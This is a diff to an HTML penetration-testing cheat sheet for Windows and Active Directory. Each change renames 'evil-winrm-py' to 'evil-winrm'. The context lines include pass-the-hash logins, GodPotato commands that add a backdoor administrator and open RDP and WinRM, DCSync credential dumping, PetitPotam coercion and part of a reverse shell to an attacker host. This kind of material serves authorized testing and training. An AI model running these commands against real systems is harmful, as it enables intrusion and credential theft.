@@ -527,8 +527,8 @@ Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' 
   </div>
   <div class="section-body">
     <h3 class="sub-title">Connect</h3>
-    <div class="code-wrap"><pre data-template>evil-winrm-py -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
-evil-winrm-py -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;</pre></div>
+    <div class="code-wrap"><pre data-template>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;</pre></div>
     <h3 class="sub-title">Enable WinRM</h3>
     <div class="code-wrap"><pre class="lang-powershell" data-template>Enable-PSRemoting -Force
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force</pre></div>
@@ -711,7 +711,7 @@ $client = New-Object System.Net.Sockets.TCPClient('&lt;LHOST&gt;',&lt;LPORT&gt;)
 
 # From attacker: use Administrator hash (or password) depending on open ports
 nxc smb &lt;IP&gt; -u Administrator -H &lt;NTHASH&gt;
-evil-winrm-py -i &lt;IP&gt; -u Administrator -H &lt;NTHASH&gt;
+evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NTHASH&gt;
 psexec.py -hashes :&lt;NTHASH&gt; Administrator@&lt;IP&gt;
 wmiexec.py -hashes :&lt;NTHASH&gt; Administrator@&lt;IP&gt;</pre></div>
     <h4 class="sub-subtitle">GodPotato - WinRM (evil-winrm user)</h4>
@@ -723,7 +723,7 @@ wmiexec.py -hashes :&lt;NTHASH&gt; Administrator@&lt;IP&gt;</pre></div>
 .\godpotato.exe -cmd "cmd /c winrm quickconfig -q &amp; netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=TCP localport=5985 &amp; sc stop WinRM &amp; ping 127.0.0.1 -n 5 &gt; nul &amp; sc start WinRM"
 
 # Connect with new user (from attacker)
-evil-winrm-py -i &lt;IP&gt; -u bob -p 'Password123!'</pre></div>
+evil-winrm -i &lt;IP&gt; -u bob -p 'Password123!'</pre></div>
     <h4 class="sub-subtitle">GodPotato - RDP user</h4>
     <div class="code-wrap"><pre class="lang-powershell" data-template>.\godpotato.exe -cmd "cmd /c net user bob Password123! /add &amp; net localgroup administrators bob /add &amp; net localgroup &quot;Remote Desktop Users&quot; bob /add"
 .\godpotato.exe -cmd "cmd /c reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f &amp; netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 &amp; sc start TermService"
@@ -1447,7 +1447,7 @@ hashcat -m 13100 output.txt &lt;WORDLIST&gt;</pre></div>
     <div class="code-wrap"><pre data-template>bloodyAD --host &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' set owner TARGET &lt;USER&gt;</pre></div>
     <h3 class="sub-title">GetChangesAll (DCSync)</h3>
     <div class="code-wrap"><pre data-template>secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;IP&gt;
-evil-winrm-py -i &lt;IP&gt; -u Administrator -H &lt;NTHASH&gt;</pre></div>
+evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NTHASH&gt;</pre></div>
   </div>
 </div>
 
@@ -1587,12 +1587,12 @@ python3 PetitPotam.py -u &lt;USER&gt; -p '&lt;PASS&gt;' &lt;LHOST&gt; &lt;IP&gt;
   <div class="section-body">
     <h3 class="sub-title">Decision Tree</h3>
     <table><tr><th>What You Have</th><th>Port</th><th>Tool</th><th>Privilege</th></tr>
-    <tr><td>Password</td><td>5985</td><td><code>evil-winrm-py</code></td><td>Admins / Remote Mgmt Users</td></tr>
+    <tr><td>Password</td><td>5985</td><td><code>evil-winrm</code></td><td>Admins / Remote Mgmt Users</td></tr>
     <tr><td>Password</td><td>135</td><td><code>impacket-wmiexec</code></td><td>Local Administrator</td></tr>
     <tr><td>Password</td><td>445</td><td><code>impacket-psexec</code></td><td>Local Administrator</td></tr>
     <tr><td>Password</td><td>3389</td><td><code>xfreerdp</code></td><td>RDP Users</td></tr>
     <tr><td>NTLM Hash</td><td>135/445</td><td><code>-hashes :&lt;NTHASH&gt;</code></td><td>Local Admin</td></tr>
-    <tr><td>NTLM Hash</td><td>5985</td><td><code>evil-winrm-py -H</code></td><td>Admins / Remote Mgmt Users</td></tr>
+    <tr><td>NTLM Hash</td><td>5985</td><td><code>evil-winrm -H</code></td><td>Admins / Remote Mgmt Users</td></tr>
     <tr><td>Kerberos TGT</td><td>Any</td><td><code>-k -no-pass</code></td><td>Depends on ticket</td></tr></table>
     <h3 class="sub-title">Find Targets (nxc)</h3>
     <div class="code-wrap"><pre data-template>nxc smb targets -u &lt;USER&gt; -p '&lt;PASS&gt;'
@@ -1600,9 +1600,9 @@ nxc winrm targets -u &lt;USER&gt; -p '&lt;PASS&gt;'
 nxc smb &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x whoami
 nxc winrm &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x whoami</pre></div>
     <h3 class="sub-title">WinRM</h3>
-    <div class="code-wrap"><pre data-template>evil-winrm-py -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
-evil-winrm-py -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;
-evil-winrm-py -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -s 5986</pre></div>
+    <div class="code-wrap"><pre data-template>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -s 5986</pre></div>
     <h3 class="sub-title">WinRM (Windows native)</h3>
     <div class="code-wrap"><pre class="lang-powershell" data-template>winrs -r:&lt;IP&gt; -u:&lt;USER&gt; -p:&lt;PASS&gt; "whoami"
 $cred = New-Object PSCredential('&lt;DOMAIN&gt;\&lt;USER&gt;', (ConvertTo-SecureString '&lt;PASS&gt;' -AsPlainText -Force))
